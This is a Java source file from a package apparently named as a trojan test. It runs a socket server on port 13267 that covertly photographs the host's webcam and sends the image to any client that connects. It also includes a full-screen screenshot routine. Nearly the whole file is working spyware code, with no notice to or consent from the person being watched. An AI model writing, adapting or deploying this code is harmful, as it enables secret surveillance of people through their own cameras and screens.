package iit.trojan.test2;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;

public class SimpleFileServer {

	public final static int SOCKET_PORT = 13267; //
	public final static String FILE_TO_SEND = "testCam.jpg";

	public static void takePictureCam() {
		Webcam webcam = null;
		try {
			// get default webcam and open it
			webcam = Webcam.getDefault();
			webcam.setViewSize(WebcamResolution.VGA.getSize());
			webcam.open();
			// get image
			BufferedImage image = webcam.getImage();

			// save image to jpg file
			ImageIO.write(image, "jpg", new File("testCam.jpg"));

		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			webcam.close();
		}
	}

	public static void imageScreen() {
		try {
			/*
			 * Let the program wait for 5 seconds to allow you to open the window whose
			 * screenshot has to be captured
			 */
			Thread.sleep(1000);
			Robot robot = new Robot();
			String fileName = "FullScreenshot.jpg";
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
			ImageIO.write(screenFullImage, "jpg", new File(fileName));

		} catch (AWTException | IOException | InterruptedException ex) {
			System.err.println(ex);
		}
	}

	public static void detectCam() {
		Webcam webcam = Webcam.getDefault();
		if (webcam != null) {
			System.out.println("Webcam: " + webcam.getName());
		} else {
			System.out.println("No webcam detected");
		}
	}

	public static void main(String[] args) throws Exception {
		FileInputStream fis = null;
		BufferedInputStream bis = null;
		OutputStream os = null;
		ServerSocket servsock = null;
		Socket sock = null;
		try {
			servsock = new ServerSocket(SOCKET_PORT);
			while (true) {
				System.out.println("Waiting...");
				try {
					sock = servsock.accept();
					System.out.println("Accepted connection : " + sock);
					// send file
					takePictureCam();
					
					
					Thread.sleep(1000);
					File myFile = new File(FILE_TO_SEND);
					byte[] mybytearray = new byte[(int) myFile.length()];
					fis = new FileInputStream(myFile);
					bis = new BufferedInputStream(fis);
					bis.read(mybytearray, 0, mybytearray.length);
					os = sock.getOutputStream();
					System.out.println("Sending " + FILE_TO_SEND + "(" + mybytearray.length + "bytes)");
					os.write(mybytearray, 0, mybytearray.length);
					os.flush();
					System.out.println("Done.");
				} finally {
					if (bis != null)
						bis.close();
					if (os != null)
						os.close();
					if (sock != null)
						sock.close();
				}
			}
		} finally {
			if (servsock != null)
				servsock.close();
		}
	}
}